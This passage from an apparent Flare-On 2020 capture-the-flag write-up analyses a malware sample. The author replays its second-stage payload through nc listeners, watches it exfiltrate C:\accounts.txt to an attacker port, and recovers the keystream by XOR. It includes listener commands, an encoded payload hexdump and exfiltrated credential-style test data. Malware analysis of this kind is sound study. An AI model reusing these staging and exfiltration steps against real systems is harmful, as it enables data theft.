Hexdump](https://gchq.github.io/CyberChef/#recipe=From_Hexdump\(\)&input=ICAgIDAwMDAwMDAwICA5YyA1YyA0ZiA1MiBhNCBiMSAwMyA3MyAgOTAgZTQgYzggOGUgOTcgYjAgYzkgNWIgICAuXE9SLi4ucyAuLi4uLi4uWwogICAgMDAwMDAwMTAgIGM2IDMwIGRjIDZhIGJkIGY0IDIwIDM4ICA4NiBmOSAzMCAyNiBhZiBlZCBkMCA4OCAgIC4wLmouLiA4IC4uMCYuLi4uCiAgICAwMDAwMDAyMCAgMWIgOTIgNGYgZTUgMDkgY2QgNWMgMmUgIGY1IGUxIDY4IGY4IDA4IDJiIDQ4IGRhICAgLi5PLi4uXC4gLi5oLi4rSC4KICAgIDAwMDAwMDMwICBmNyA1OSA5YSBkNCBiYiA5MiAxOSBhZSAgMTAgN2IgNmUgZWQgN2IgNmQgYjEgODUgICAuWS4uLi4uLiAue24ue20uLgogICAgMDAwMDAwNDAgIDRkIDEwIDMxIGQyIDhhIDRlIDdmIDI2ICA4YiAxMCBmZCBmNCAxYyBjMSA3ZiBhYiAgIE0uMS4uTi4mIC4uLi4uLi4uCiAgICAwMDAwMDA1MCAgNWEgNzMgOTIgMDIgYzAgY2IgNDkgZDkgIDUzIGQ2IGRmIDZjIDAzIDgxIGEwIDIxICAgWnMuLi4uSS4gUy4ubC4uLiEKICAgIDAwMDAwMDYwICAwMSA2ZSA4NyA1ZiAwOSBmZSA5YSA2OSAgOTQgMzUgODQgNGYgMDEgOTYgNmUgNzcgICAubi5fLi4uaSAuNS5PLi5udwogICAgMDAwMDAwNzAgIGVjIGEzIGYzIGY1IDJmIDZhIDM2IDM2ICBhYiA0NyA3NSBiNSA4MCBjYiA0NyBiZCAgIC4uLi4vajY2IC5HdS4uLkcuCiAgICAwMDAwMDA4MCAgOWYgNzYgMzggYTUgNDAgNDggNTcgOWMgIDM2IGFkIDhlIDc5IDQ1IGEzIDIwIGZhICAgLnY4LkBIVy4gNi4ueUUuIC4KICAgIDAwMDAwMDkwICBlZCAxZiAxOCA0OSBiOCA4OSAxOCA0OCAgMmIgNWIgNmYgZWUgZjQgYzMgZDYgZGMgICAuLi5JLi4uSCArW28uLi4uLgogICAgMDAwMDAwQTAgIGNjIDg0IGVhIGIxIDAxIDA5IGIxIDMxICA0YiBhNCAwNSA1MCA5OCBiMCA3MyBhZSAgIC4uLi4uLi4xIEsuLlAuLnMuCiAgICAwMDAwMDBCMCAgOWMgMTQgMTAgMWIgNjUgYmQgOTMgODIgIDZjIDU3IGI5IDc1IDdhIDJhIGVlIGRlICAgLi4uLmUuLi4gbFcudXoqLi4KICAgIDAwMDAwMEMwICAxMCBmYiAzOSBiYSA5NiBkMCAzNiAxZiAgYzIgMzEgMmMgYzUgNGYgMzMgYTUgMTMgICAuLjkuLi42LiAuMSwuTzMuLgogICAgMDAwMDAwRDAgIGUxIDU5IDU2IDkyIGM1IDFmIGE1IDRlICAwZSA2MiA2ZSBkYiA1YiBlOCA3ZiA4ZCAgIC5ZVi4uLi5OIC5ibi5bLi4uCiAgICAwMDAwMDBFMCAgMDEgYTYgN2QgMDEgMmIgMDIgNDMgMWYgIDU0IGI5IGJjIGQ1IGVmIDJkIGIzIGRhICAgLi59LisuQy4gVC4uLi4tLi4KICAgIDAwMDAwMEYwICBlZiAzZCBkMCA2OCBmZSBkYSBkZSA2MCAgYjEgMTcgZmUgZWEgMjAgNGEgMmMgYTEgICAuPS5oLi4uYCAuLi4uIEosLgogICAgMDAwMDAxMDAgIGJiIGExIGI1IGM1IDEyIDkyIGE5IGRiICBmMSAxMSBlMyA4YyA1OCBiYSBkYyAzZCAgIC4uLi4uLi4uIC4uLi5YLi49CiAgICAwMDAwMDExMCAgMjggODYgNjYgYzggNmQgMGUgYWIgZmEgIDgzIGQ1IDI0IDYwIDEwIDY4IDFkIGM3ICAgKC5mLm0uLi4gLi4kYC5oLi4KICAgIDAwMDAwMTIwICBhZiBjNyBhYyA0NSAxMyBhMyBkOSA3MiAgZTcgY2MgNTEgNzkgZjUgNjcgNDEgN2MgICAuLi5FLi4uciAuLlF5LmdBfAogICAgMDAwMDAxMzAgIGFlIDdmIGM4IDdlIDk1IDQ2IDA5IGY2ICBlZiA0YiA0NSAwMiA3NCA1MiAxMCA1MCAgIC4uLn4uRi4uIC5LRS50Ui5QCiAgICAwMDAwMDE0MCAgMWMgYjcgNmEgN2MgZWIgMDAgZDcgNTkgIGMzIDI5IDAyIDM3IGQwIDQ3IDJlIDFlICAgLi5qfC4uLlkgLikuNy5HLi4KICAgIDAwMDAwMTUwICAzYSBmNyBlNiBhYyA4MiAxNCA3NCBlYiAgNGYgNmIgNTcgMjIgMTMgZjYgZjIgNDggICA6Li4uLi50LiBPa1ciLi4uSAogICAgMDAwMDAxNjAgIGQ2IDZiIGNiIGI0IGVkIGE3IDMyIDY4ICBjYiBkMCA2NiA0MiBkMyBjNSBmMiBjNSAgIC5rLi4uLjJoIC4uZkIuLi4uCiAgICAwMDAwMDE3MCAgMzcgZGYgN2QgOWYgOWYgMjggYzAgNzQgIDNhIGJlIGI4IGMwIGE3IDczIGQwIGJiICAgNy59Li4oLnQgOi4uLi5zLi4KICAgIDAwMDAwMTgwICBmYSA1MCA3YyAxMCAxZSBkYSBiMSAyMyAgZDYgYzQgODEgYTUgZDMgYjYgMjIgMjkgICAuUHwuLi4uIyAuLi4uLi4iKQogICAgMDAwMDAxOTAgIDA5IDZiIDIxIGE2IDVjIDM4IGM2IDgwICAzZCBiZSAwOCAyMyBjNyBiMSAxZiA2ZCAgIC5rIS5cOC4uID0uLiMuLi5tCiAgICAwMDAwMDFBMCAgZTYgNjQgNjYgOTUgZGMgMTAgYTcgMTMgIDQyIGNkIDNiIGZhIGRjIGRhIDE0IDhkICAgLmRmLi4uLi4gQi47Li4uLi4KICAgIDAwMDAwMUIwICBkMCA1YSBjOCA4MSAzNSA1NCAyZiBiNSAgZGMgNjEgZDYgMjggNzcgODggYzUgNTggICAuWi4uNVQvLiAuYS4ody4uWAogICAgMDAwMDAxQzAgIDcwIGI1IDJmIGNmIGVhIDRmIDRkIDg1ICA1NiAwNCAwNyBmMyA5MCA3NCBjZSA1ZCAgIHAuLy4uT00uIFYuLi4udC5dCiAgICAwMDAwMDFEMCAgM2MgOGEgMmIgMDYgYjQgOWYgZTYgNmQgIDc5IGMwIDZlIDNkIGQ4IDNlIDIwIDA4ICAgPC4rLi4uLm0geS5uPS4%2BIC4KICAgIDAwMDAwMUUwICBiNyA3NCAzZCAzNiA5OSBjZCA3ZiA2MCAgN2QgOWMgYzkgYjMgYWQgMGMgOGUgNDUgICAudD02Li4uYCB9Li4uLi4uRQogICAgMDAwMDAxRjAgIDZkIGVhIDNkIGRkIDA5IDFkIGRhIDBiICAzYSAxYyBmYyBjYiA4MSA0OCBlZCA1YSAgIG0uPS4uLi4uIDouLi4uSC5aCiAgICAwMDAwMDIwMCAgZmEgY2UgZjggYzYgMjMgYjAgMWUgMjYgIDQ0IGEzIGQ5IGFiIDBlIGQ1IDk4IGIxICAgLi4uLiMuLiYgRC4uLi4uLi4KICAgIDAwMDAwMjEwICAzMyA2NSA1ZCBlZCA2YSBkMyAyMyA3ZiAgMDIgNGEgYjMgYTIgZjggMWQgN2UgZDEgICAzZV0uai4jLiAuSi4uLi5%2BLgogICAgMDAwMDAyMjAgIDJmIDVmIGJlIDg5IDYxIDVlIDJjIGU0ICBiOCA5NiAxOSBlNSA0OSA3NiA0ZSA3YSAgIC9fLi5hXiwuIC4uLi5Jdk56CiAgICAwMDAwMDIzMCAgZTggOTIgYTMgNzAgNTUgNmYgN2QgM2MgIGY5IGMxIDM2IDQ0IDY5IDMzIDdkIGRmICAgLi4ucFVvfTwgLi42RGkzfS4KICAgIDAwMDAwMjQwICA3OSAzNyBiOCBlMCBhYSBlOCA2YSA1ZCAgYzkgM2IgMTggMGYgNGUgMjggM2EgMzEgICB5Ny4uLi5qXSAuOy4uTig6MQogICAgMDAwMDAyNTAgIGE4IDdmIGVmIGI4IDE5IGFjIDM2IDYzICBlOCA4OSAyMSA0ZCA4MyBhNyA3ZSA1NyAgIC4uLi4uLjZjIC4uIU0uLn5XCiAgICAwMDAwMDI2MCAgMDMgNDggOWIgZTEgMjcgOTMgMDYgZTQgIDNiIDY3IDVmIGU1IDY5IDUwIDAwIDNlICAgLkguLicuLi4gO2dfLmlQLj4KICAgIDAwMDAwMjcwICA4YiAwMSBiNyBlZiBhNiBiNSA0YiAzNiAgODIgZDQgZmIgOWYgZGUgOGIgMjcgY2MgICAuLi4uLi5LNiAuLi4uLi4nLgogICAgMDAwMDAyODAgIGE0IDU3IGNlIDI1IDM3IDQ0IDUwIDQyICBmNyA3ZSBhMiBiZiA0ZiBkZiAwZiA3MiAgIC5XLiU3RFBCIC5%2BLi5PLi5yCiAgICAwMDAwMDI5MCAgZDggNjYgNGEgM2UgZjUgYzggMjYgMmEgIGM1IDg4IDdiIDk3IGFiIDIzIDViIDJiICAgLmZKPi4uJiogLi57Li4jWysKICAgIDAwMDAwMkEwICA2MSBkOCAzZiAwMCAzNyAwZSA3ZSAxNCAgZmEgZmQgN2QgZjcgODEgNDkgYzIgYTEgICBhLj8uNy5%2BLiAuLn0uLkkuLgogICAgMDAwMDAyQjAgIDg1IDFiIGQwIDI4IGJlIGE1IDI0IGZkICA2MCBiMiA3OCAyNyA0ZSBhYyBlOCA3OSAgIC4uLiguLiQuIGAueCdOLi55CiAgICAwMDAwMDJDMCAgM2IgM2IgN2EgZGMgNTYgZDAgNzYgYzUgIDAxIDBmIGNmIDQzIGI1IGQ0IDVmIDQ4ICAgOzt6LlYudi4gLi4uQy4uX0gKICAgIDAwMDAwMkQwICA3MCBiZCBhYyA2NSA3NiBkYiAxMSAzYiAgNWIgY2YgOWMgNTIgOGIgMDAgMWUgODMgICBwLi5ldi4uOyBbLi5SLi4uLgogICAgMDAwMDAyRTAgIGYxIGZhIDkyIDViIDc3IDc5IDA3IDZhICBlMCBkNCAzMyA5YSA3MSBiYSAyNCBhNSAgIC4uLlt3eS5qIC4uMy5xLiQuCiAgICAwMDAwMDJGMCAgYTUgYzggZWIgNGMgMDEgYjMgZDMgY2QgIDJjIDIyIDhjIDBiIDRjIGNkIDJkIDVhICAgLi4uTC4uLi4gLCIuLkwuLVoKICAgIDAwMDAwMzAwICA4YyA5YSBiMSA2NyA3MCA3ZiA3NSA5NiAgZTIgNTYgYzEgMWQgZmYgMDUgN2UgNzcgICAuLi5ncC51LiAuVi4uLi5%2BdwogICAgMDAwMDAzMTAgIGEyIGJhIGU1IDlhIGFlIGY5IGY4IGIyICBmMSA3OCBkMiBiMSBkYyBlOSAwMyBjMiAgIC4uLi4uLi4uIC54Li4uLi4uCiAgICAwMDAwMDMyMCAgZDQgZmYgMWYgNjYgY2QgYjAgNDcgZjAgIGI0IGQxIGY2IDcyIGZhIDFlIGI3IGYxICAgLi4uZi4uRy4gLi4uci4uLi4KICAgIDAwMDAwMzMwICA0ZCBlNyA2ZSA0MiAxMCBlYyA1ZCA5NCAgMzAgZGQgN2YgNzUgMWMgMDEgNDUgNDYgICBNLm5CLi5dLiAwLi51Li5FRgogICAgMDAwMDAzNDAgIGI2IDE0IDZjIGY3IDQ1IDM2IDU4IGVjICBlZiBmMyAzNyAwNCA5YyAyMSBlYiA5NCAgIC4ubC5FNlguIC4uNy4uIS4uCiAgICAwMDAwMDM1MCAgNTQgYTMgZmUgMjMgY2IgYmIgMzEgNWMgIDYyIDc1IGJkIGVkIDI3IDkwIGZlIDkxICAgVC4uIy4uMVwgYnUuLicuLi4KICAgIDAwMDAwMzYwICAxNyBlMiBhZSA0MiA5YiA3OSAwNCBkMSAgNWMgZWYgY2QgNGIgODYgOTMgNGEgNzQgICAuLi5CLnkuLiBcLi5LLi5KdAogICAgMDAwMDAzNzAgIDQxIDJkIGFkIDBiIDM1IDFkIDgxIGZkICAxMCAyYyA4ZSBmZCA4YyA2OCAxZCBmNSAgIEEtLi41Li4uIC4sLi4uaC4uCiAgICAwMDAwMDM4MCAgNDUgMGEgYjUgYjQgMDkgYmUgMGUgZmEgIGZhIGQyIGY3IDRlIDU4IGQ4IDNjIDFhICAgRS4uLi4uLi4gLi4uTlguPC4KICAgIDAwMDAwMzkwICAxYiAxMSAzZCA5OSAyNSA1MyBhYiA3OCAgYWMgNTQgNDkgYmIgMmEgNDIgYjMgODAgICAuLj0uJVMueCAuVEkuKkIuLgogICAgMDAwMDAzQTAgIDY2IGI1IDYzIGUyIDkwIGY4IGE1IDhmICAzNyBhZiA5NyAxMyAyYiBlOCBmYyA1ZCAgIGYuYy4uLi4uIDcuLi4rLi5dCiAgICAwMDAwMDNCMCAgNGIgNzEgOGIgNGQgOWYgYzggZWMgMDcgIDI4IDFmIGNiIDMwIDkyIDFlIDZkIGRjICAgS3EuTS4uLi4gKC4uMC4ubS4KICAgIDAwMDAwM0MwICBiOSBkZSA5NCBiOCBlOSBjYiA1YSBmNyAgYTIgYjAgYmIgMGYgYzMgMzggYjcgMjcgICAuLi4uLi5aLiAuLi4uLjguJwogICAgMDAwMDAzRDAgIDMzIDFiIGU5IGJmIDQ1IDJkIDg2IDNlICAzNCA2ZCAxMiBmNiAwNSAxMiAyNyBjNSAgIDMuLi5FLS4%2BIDRtLi4uLicuCiAgICAwMDAwMDNFMCAgMjggZTQgZDIgNjEgMjYgN2UgOTkgMmIgIDNmIDFmIDAzIDRkIDc5IDcyIGI5IDgzICAgKC4uYSZ%2BLisgPy4uTXlyLi4KICAgIDAwMDAwM0YwICA1NiA2ZCA4ZSA4MiAzMyBjMiAwOSBlYiAgMjEgNGEgMGMgMTMgYWQgZWEgMjkgMWIgICBWbS4uMy4uLiAhSi4uLi4pLgogICAgMDAwMDA0MDAgIDU4IGRhIDEwIDE2IDQzIDIwIDU1IDdkICBmNCBiNyBmYyAyNiAzNCA2OCA4YiBhMCAgIFguLi5DIFV9IC4uLiY0aC4uCiAgICAwMDAwMDQxMCAgNTQgYWYgMDcgZDUgZDUgMjMgYjUgMjMgIGI4IGZiIDA3IGM2IDY0IDRhIDU2IDdmICAgVC4uLi4jLiMgLi4uLmRKVi4KICAgIDAwMDAwNDIwICBhMCA2ZCA4NiA3YyAzMyAzYiAyMyBiNyAgOWQgOWMgYTggMjIgYjEgNzkgOWYgMDAgICAubS58MzsjLiAuLi4iLnkuLgogICAgMDAwMDA0MzAgIGU3IDc2IGU5IGM3IDY4IGFlIDVjIDIzICBhZSA5ZiBjNiA0NSA5MSA0OCA4MyA2ZiAgIC52Li5oLlwjIC4uLkUuSC5vCiAgICAwMDAwMDQ0MCAgYmYgMGEgZDggYzkgNzcgYWIgMmMgMmQgIDg1IDQ3IGJmIGU5IDgxIDgwIDEzIGQ5ICAgLi4uLncuLC0gLkcuLi4uLi4KICAgIDAwMDAwNDUwICBkYyAxYyAyMSAwZiBmNCBjNyA3OSAwNyAgNTIgYTggMDYgOGMgNTcgNjMgNTMgYjIgICAuLiEuLi55LiBSLi4uV2NTLgogICAgMDAwMDA0NjAgIGZiIDdkIGJlIDZjIDFhIGFlIDJlIGJkICBjNiBmZCA5NyAwYSAwNCBlZCBjMCBhMyAgIC59LmwuLi4uIC4uLi4uLi4uCiAgICAwMDAwMDQ3MCAgMDUgNDUgZGIgOWIgNjIgYmQgMzQgYTkgIDA4IDI1IDUzIDAwIDkwIDM2IGNmIGQ5ICAgLkUuLmIuNC4gLiVTLi42Li4KICAgIDAwMDAwNDgwICA2MyAxNSBhNSBmNyBmOCBlMCBkOCA2OSAgZmQgNzkgMjQgNjAgN2IgYTIgYWUgYmQgICBjLi4uLi4uaSAueSRgey4uLgogICAgMDAwMDA0OTAgIGYyIGI0IGI5IGMyIDA4IDg0IDY1IGE5ICA2ZCBlYiBhNSBkOCA3MiBhNyBiNiA1OSAgIC4uLi4uLmUuIG0uLi5yLi5ZCiAgICAwMDAwMDRBMCAgMjEgYjkgZjQgMTEgMTIgNWQgMzkgMWQgIDE1IDc1IDZkIDhhIDJmIDU4IGMyIGZjICAgIS4uLi5dOS4gLnVtLi9YLi4KICAgIDAwMDAwNEIwICA4MCAwMiA1MSA3OCBhOSBmYyA3ZCBkZSAgMGQgODUgYTUgNTcgMTggZjggZjAgY2MgICAuLlF4Li59LiAuLi5XLi4uLgogICAgMDAwMDA0QzAgIDhlIDRjIDVlIGQ3IDY1IDU4IDc0IDRlICA4YSA0NCAzMyBhMiAyNCBlMyA1NiA1NyAgIC5MXi5lWHROIC5EMy4kLlZXCiAgICAwMDAwMDREMCAgNjggYmEgYmIgZjIgYjIgMzIgOTggZjEgIDg4IDJlIGMzICAgICAgICAgICAgICAgICAgaC4uLi4yLi4gLi4uCg)
to decode it and then save the result to a file.

I started a `nc` listener on 4444 which will send the response payload:

    
    
    root@kali# nc -lnvp 4444 < resp.dat 
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::4444
    Ncat: Listening on 0.0.0.0:4444
    

I also started a listener on 1337 on the chance that the code still worked and
that caused data to come back to me. On running my exe, there’s a connection
first at 4444, then at 1337. Neither outputs any data.

At this point, I think the second stage is looking for the file with the flag
in it, but it’s not there.

### Find File

I started `procmon.exe` (from [Sysinternals](https://docs.microsoft.com/en-
us/sysinternals/)), started the same listeners, and ran the exe again. This
part is interesting:

![image-20200924214257383](https://0xdfimages.gitlab.io/img/image-20200924214257383.png)

It connects to and receives from the attacker box, then tries to open
`C:\accounts.txt` but fails because it doesn’t exist. Then it connects to the
attacket on 1337. That file name is the same one mentioned in the chat at the
start of the PCAP.

I put some data into that file, started up both `nc`, and ran again. I created
the test file on Linux because it’s a cleaner file:

    
    
    root@kali# echo "this is a test" > accounts.txt 
    

I copied that into `C:\`. I had the 1337 listener output into `xxd` because I
expect binary data:

    
    
    root@kali# nc -lnvp 1337 | xxd
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::1337
    Ncat: Listening on 0.0.0.0:1337
    Ncat: Connection from 192.168.68.1.
    Ncat: Connection from 192.168.68.1:26913.
    00000000: 4561 47ca ed7e 8c32 80f5 000f ab8f 20    EaG..~.2...... 
    

What is interesting is that the test data and this encrypted data are both 15
bytes long. That implies some kind of stream cipher.

### Decrypt

I saved the encrypted exfil to a file with
[Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hexdump\(\)&input=MDAwMDAwMDAgIDQzIDY2IDU3IDgzIGE1IDIzIDg5IDc3ICBiZSBhYyAxYiAxZiA4NyA4ZiA1OCA5MyAgIENmVy4uIy53IC4uLi4uLlguCjAwMDAwMDEwICAzZiAyNCBjZiAyYyBkMyA5YSBhOCBkMSAgMTEgYzQgYmMgYTYgN2YgY2QgMzggZGIgICA/JC4sLi4uLiAuLi4uLi44LgowMDAwMDAyMCAgYjMgM2MgMDMgNGIgYWIgZjUgNjAgYzUgIDYwIGQyIDBkIDFkIDE4IDg4IDQxIDViICAgLjwuSy4uYC4gYC4uLi4uQVsKMDAwMDAwMzAgIDRmIDA2IDE3IDZjIDllIDBiIDAxIDczICA5ZCA4MyA2MCAxOCBmYSA4YiBmZiBmOCAgIE8uLmwuLi5zIC4uYC4uLi4uCjAwMDAwMDQwICA0ZCA3OCBiMiBhNCAyNCA2ZiBhZSBiZCAgOTIgZDEgZWMgY2MgMmQgN2MgOGIgYmYgICBNeC4uJG8uLiAuLi4uLXwuLgowMDAwMDA1MCAgZDAgOGMgYmQgZTIgNDUgZWYgMTUgYjIgIDg4IGJjIGE0IDU5IGJlIDIwIGFjIGY5ICAgLi4uLkUuLi4gLi4uWS4gLi4KMDAwMDAwNjAgIDU3IGRmIDEwIGJhIGJjIGQ5IDExIDkzICA0MSAxOSAwMCA5YyAwMiAyNSBlZiBjNCAgIFcuLi4uLi4uIEEuLi4uJS4uCjAwMDAwMDcwICA0YSAyNiBmZCAyNSBjYSA5YiA4NSAxOSAgNjQgNGUgYzUgODQgOWYgYTEgMDAgMTggICBKJi4lLi4uLiBkTi4uLi4uLgowMDAwMDA4MCAgMmMgNjggMzAgZGMgNzAgNGMgZmUgODMgIGYxIGM3IDAwIDJiIDQ5IDdhIDgzIDA5ICAgLGgwLnBMLi4gLi4uK0l6Li4KMDAwMDAwOTAgIDA1IDc3IDZlIDBhIDA4IDhkIDU2IGU0ICAzOCA3ZSA4OCAwZiAyYyA0MSBlNCAzMyAgIC53bi4uLlYuIDh%2BLi4sQS4zCjAwMDAwMEEwICA2NiBjOSBiYyAwNiBhYSAyYSBhMSA5NiAgMmQgOTQgYzAgMDggMTYgMWUgYTQgZjIgICBmLi4uLiouLiAtLi4uLi4uLgowMDAwMDBCMCAgODEgMWEgODMgZjcgN2MgYjUgN2QgNjMgIDEzIDAwIDQxIDk2IGNhIDY5IDgwIGFlICAgLi4uLnwufWMgLi5BLi5pLi4KMDAwMDAwQzAgIDQ5IGU5IDVkIDBmIDdkIDg5IDQzIGQ0ICA4OSAxYSAwMSBiNCA2MSA2MSAgICAgICAgIEkuXS59LkMuIC4uLi5hYQ)
just like before. My first thought was to put a long file in place, and have
it exfiled to me. If I know the plaintext and the ciphertext, there’s a chance
that I can xor them to get the key stream, and then xor that with the
ciphertext from the PCAP to get the PCAP plaintext.

To make it simple, I created a file longer than the PCAP ciphertext of all
nulls:

    
    
    root@kali# wc flag-encrypted.dat 
      1   6 206 flag-encrypted.dat
    root@kali# python3 -c 'print("\x00"*220, end="")' > null.txt
    root@kali# wc null.txt 
      0   0 220 null.txt
    

I dropped that into place at `C:\accounts.txt`, and collected the result from
1337 to a file. Because the plaintext is all null, the resulting data should
be the key stream. I’ll xor it against the PCAP ciphertext in a Python Repl,
and it gives the flag:

    
    
    >>> with open('keystream.bin', 'rb') as f:
    ...     keystream = f.read()
    ... 
    >>> with open('flag-encrypted.dat', 'rb') as f:
    ...     ciphertext = f.read()
    ... 
    >>> print(''.join([chr(c^k) for c,k in zip(ciphertext, keystream)]))
    roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat
    moss:Pot-Pocket-Pigeon-Hunt-8:narwhal
    jen:Straighten-Effective-Gift-Pity-1:bunny
    richmond:Inventor-Hut-Autumn-Tray-6:bird
    denholm:123:dog
    

Since the same keystream is being used to xor the data, I could also just put
the encrypted data in place at `accounts.txt`, and then what comes back over
`nc` will be the plaintext:

    
    
    root@kali# nc -lnvp 1337
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::1337
    Ncat: Listening on 0.0.0.0:1337
    Ncat: Connection from 192.168.68.1.
    Ncat: Connection from 192.168.68.1:26915.
    roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat
    moss:Pot-Pocket-Pigeon-Hunt-8:narwhal
    jen:Straighten-Effective-Gift-Pity-1:bunny
    richmond:Inventor-Hut-Autumn-Tray-6:bird
    denholm:123:dog
    

Either way, I’ve captured the flag.

**Flag: h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com**

[](/flare-on-2020/recrowd)

